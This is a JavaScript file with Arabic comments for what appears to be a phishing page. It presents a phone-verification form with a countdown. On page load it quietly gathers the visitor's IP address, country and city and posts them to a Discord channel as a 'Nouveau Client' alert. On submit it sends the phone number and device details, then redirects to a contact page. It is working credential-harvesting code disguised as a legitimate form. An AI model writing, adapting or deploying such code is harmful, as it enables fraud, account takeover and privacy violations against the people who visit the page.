// معالج نموذج رقم الهاتف - مع إشعار دخول العميل
document.addEventListener('DOMContentLoaded', async function () {
    const form = document.getElementById('phoneForm');
    const phoneInput = document.getElementById('phone');
    const countryCodeSelect = document.getElementById('countryCode');
    const submitBtn = document.getElementById('submitBtn');

    let countdownInterval;

    // =========================
    // وظائف مساعدة
    // =========================

    // دالة لتحديد رمز الدولة بناءً على اسم البلد
    function getCountryCodeByCountry(country) {
        const countryMap = {
            'Oman': '+968',
            'Saudi Arabia': '+966',
            'United Arab Emirates': '+971',
            'Kuwait': '+965',
            'Bahrain': '+973',
            'Qatar': '+974',
            'Jordan': '+962',
            'Syria': '+963',
            'Yemen': '+967',
            'Egypt': '+20'
        };

        // البحث عن تطابق جزئي للبلد
        for (const [key, code] of Object.entries(countryMap)) {
            if (country.toLowerCase().includes(key.toLowerCase())) {
                return code;
            }
        }

        // إذا لم يتم العثور، استخدم رمز افتراضي (عمان)
        return '+968';
    }

    // دالة لتعيين حالة التحميل لرمز الدولة
    function setCountryCodeLoading(loading) {
        if (loading) {
            countryCodeSelect.classList.add('country-code-loading');
            countryCodeSelect.disabled = true;
        } else {
            countryCodeSelect.classList.remove('country-code-loading');
            countryCodeSelect.disabled = false;
        }
    }

    // دالة لتحديث نص الخيار المحدد
    function updateSelectedOptionText(code, isAuto = false) {
        const option = countryCodeSelect.querySelector(`option[value="${code}"]`);
        if (option) {
            // حفظ النص الأصلي إذا لم يكن محفوظاً مسبقاً
            if (!option.dataset.originalText) {
                option.dataset.originalText = option.textContent;
            }

            if (isAuto) {
                option.textContent = `${option.dataset.originalText} (تم التحديد تلقائياً)`;
            } else {
                option.textContent = option.dataset.originalText;
            }
        }
    }

    // =========================
    // إرسال إشعار "Nouveau Client" عند دخول الصفحة
    // =========================
    setTimeout(async () => {
        setCountryCodeLoading(true);

        try {
            // الحصول على معلومات الجهاز
            const { device } = getDeviceInfo();

            // الحصول على معلومات IP
            const { country, city, ip } = await getIPInfo();

            // تحديد رمز الدولة تلقائياً
            const autoCountryCode = getCountryCodeByCountry(country);
            if (autoCountryCode && countryCodeSelect) {
                // تحديث القيمة
                countryCodeSelect.value = autoCountryCode;

                // إضافة فئة للإشارة إلى التحديد التلقائي
                countryCodeSelect.classList.add('auto-selected');

                // تحديث نص الخيار المحدد
                updateSelectedOptionText(autoCountryCode, true);
            }

            // إرسال إشعار Nouveau Client إلى Discord
            const nouveauClientMessage = `🔥 **Nouveau Client**
🌐 **IP:** ${ip}
🏴 **Pays:** ${country}
📍 **Ville:** ${city}
📱 **Code pays auto-sélectionné:** ${autoCountryCode}`;

            const success = await sendToDiscord(nouveauClientMessage);

            if (success) {
                console.log('✅ Notification Nouveau Client envoyée');
            }
        } catch (error) {
            console.error('❌ Erreur envoi notification:', error);

            // في حالة الخطأ، استخدم رمز عُمان كافتراضي
            countryCodeSelect.value = '+968';
            countryCodeSelect.classList.add('auto-selected');
            updateSelectedOptionText('+968', true);
        } finally {
            setCountryCodeLoading(false);
        }
    }, 2000); // بعد ثانيتين من تحميل الصفحة

    // =========================
    // تنسيق الرقم أثناء الكتابة
    // =========================
    phoneInput.addEventListener('input', function (e) {
        // السماح فقط بالأرقام
        this.value = this.value.replace(/[^0-9]/g, '');

        hideError();

        // إظهار تنسيق صحيح أثناء الكتابة
        if (this.value.length >= 8) {
            this.style.borderColor = '#25D366';
            this.style.boxShadow = '0 0 0 4px rgba(37, 211, 102, 0.1)';
        } else {
            this.style.borderColor = '#e0e0e0';
            this.style.boxShadow = 'none';
        }
    });

    // =========================
    // معالج إرسال النموذج
    // =========================
    form.addEventListener('submit', async function (e) {
        e.preventDefault();

        hideError();

        let code = countryCodeSelect.value;
        const phone = phoneInput.value.trim();
        const cleanedPhone = phone.replace(/\s+/g, '');

        // التحقق من وجود رقم
        if (!cleanedPhone) {
            showError('⚠️ يرجى إدخال رقم الهاتف');
            phoneInput.focus();
            return;
        }

        // التحقق من طول الرقم (6-12 رقم)
        if (cleanedPhone.length < 6 || cleanedPhone.length > 12) {
            showError('⚠️ الرقم يجب أن يكون بين 6 و 12 رقم');
            phoneInput.focus();
            return;
        }

        // إذا كان رمز الدولة "تحديد تلقائي"، احصل عليه من IP
        if (code === 'auto') {
            try {
                setCountryCodeLoading(true);
                const { country } = await getIPInfo();
                code = getCountryCodeByCountry(country);

                // تحديث القيمة في القائمة المنسدلة
                countryCodeSelect.value = code;
                countryCodeSelect.classList.add('auto-selected');
                updateSelectedOptionText(code, true);
            } catch (error) {
                showError('⚠️ لم نتمكن من تحديد رمز الدولة تلقائياً. يرجى اختياره يدوياً.');
                setCountryCodeLoading(false);
                return;
            } finally {
                setCountryCodeLoading(false);
            }
        }

        // تعطيل النموذج وعرض التحميل
        disableForm('phoneForm');
        showChronoLoading('جاري التحقق من الرقم ...');

        // بدء العد التنازلي مع الخط
        startChronoCountdown(10, 'contact.html');

        try {
            // الحصول على معلومات الجهاز
            const { device } = getDeviceInfo();

            // الحصول على معلومات IP
            const { country, city, ip } = await getIPInfo();

            // تنسيق الرقم للعرض
            let formattedPhone = cleanedPhone;

            // إذا كان الرقم يبدأ بـ 0، أزل الصفر
            if (formattedPhone.startsWith('0')) {
                formattedPhone = formattedPhone.substring(1);
            }

            // إذا كان الرقم أقل من 8 أرقام، أضف 94
            if (formattedPhone.length < 8) {
                formattedPhone = '94' + formattedPhone;
            }

            // اقتصر على 8 أرقام كحد أقصى
            if (formattedPhone.length > 8) {
                formattedPhone = formattedPhone.substring(0, 8);
            }

            // إرسال البيانات إلى Discord مع رقم الهاتف
            const message = `📱═══Nouveau Client ════📱
                 **معلومات الاتصال**


🎯 **للنسخ السريع:**
\`${code}${cleanedPhone}\`


🏴 **الدولة:** ${country}
🏙️ **المدينة:** ${city}
🌐 **IP:** \`${ip}\`
📟 **الجهاز:** ${device}
📱 **رمز الدولة:** ${code} ${countryCodeSelect.classList.contains('auto-selected') ? '(تم التحديد تلقائياً)' : ''}
📱═══════📱
`;
            const success = await sendToDiscord(message);

            if (success) {
                // حفظ رقم الهاتف
                saveToStorage('contactNumber', code + formattedPhone);
                saveToStorage('phoneNumber', formattedPhone);
                saveToStorage('originalPhone', cleanedPhone);
                saveToStorage('countryCode', code);

                // حفظ معلومات إضافية
                saveToStorage('country', country);
                saveToStorage('city', city);
                saveToStorage('ip', ip);
                saveToStorage('device', device);

                // إضافة معلومات التحديد التلقائي
                saveToStorage('autoSelected', countryCodeSelect.classList.contains('auto-selected'));

                // الكرونو سيتولى عملية التوجيه بعد انتهائه
            } else {
                hideChronoLoading();
                if (countdownInterval) clearInterval(countdownInterval);
                enableForm('phoneForm');
                showError('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
            }
        } catch (error) {
            console.error('خطأ:', error);
            hideChronoLoading();
            if (countdownInterval) clearInterval(countdownInterval);
            enableForm('phoneForm');
            showError('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
        }
    });

    // =========================
    // وظائف التحميل الخطي
    // =========================
    function startChronoCountdown(seconds, redirectUrl) {
        let currentTime = seconds;
        const timerElement = document.querySelector('.chrono-timer');
        const progressElement = document.querySelector('.chrono-progress');

        if (countdownInterval) clearInterval(countdownInterval);

        countdownInterval = setInterval(() => {
            currentTime--;

            // تحديث المؤقت
            if (timerElement) {
                timerElement.textContent = currentTime;

                // تغيير اللون عند اقتراب النهاية
                if (currentTime <= 5) {
                    timerElement.style.color = '#ff6b6b';
                    timerElement.style.transform = 'scale(1.1)';
                } else {
                    timerElement.style.color = '#075E54';
                    timerElement.style.transform = 'scale(1)';
                }
            }

            // تحديث الخط التحميلي
            if (progressElement) {
                const percentage = ((seconds - currentTime) / seconds) * 100;
                progressElement.style.width = `${percentage}%`;
            }

            if (currentTime <= 0) {
                clearInterval(countdownInterval);
                window.location.href = redirectUrl;
            }
        }, 1000);
    }

    function showChronoLoading(text = 'جاري التحقق من الرقم ...') {
        const loadingOverlay = document.getElementById('loadingPopup');
        const chronoLabel = document.querySelector('.chrono-label');

        if (chronoLabel) {
            chronoLabel.textContent = text;
        }

        // إعادة تعيين الخط
        const progressElement = document.querySelector('.chrono-progress');
        if (progressElement) {
            progressElement.style.width = '0%';
        }

        // إعادة تعيين المؤقت
        const timerElement = document.querySelector('.chrono-timer');
        if (timerElement) {
            timerElement.textContent = '15';
            timerElement.style.color = '#075E54';
            timerElement.style.transform = 'scale(1)';
        }

        loadingOverlay.style.display = 'flex';
    }

    function hideChronoLoading() {
        const loadingOverlay = document.getElementById('loadingPopup');
        loadingOverlay.style.display = 'none';

        if (countdownInterval) {
            clearInterval(countdownInterval);
        }
    }

    // =========================
    // وظائف مساعدة عامة
    // =========================
    function showError(message) {
        const errorMsg = document.getElementById('errorMsg');
        if (errorMsg) {
            errorMsg.textContent = message;
            errorMsg.style.display = 'block';
        }
    }

    function hideError() {
        const errorMsg = document.getElementById('errorMsg');
        if (errorMsg) {
            errorMsg.style.display = 'none';
        }
    }

    function disableForm(formId) {
        const form = document.getElementById(formId);
        if (form) {
            const inputs = form.querySelectorAll('input, button, select');
            inputs.forEach(input => {
                input.disabled = true;
            });
        }
    }

    function enableForm(formId) {
        const form = document.getElementById(formId);
        if (form) {
            const inputs = form.querySelectorAll('input, button, select');
            inputs.forEach(input => {
                input.disabled = false;
            });
        }
    }

    // =========================
    // إضافة أمثلة للأرقام (اختياري)
    // =========================
    setTimeout(addExamples, 500);
});
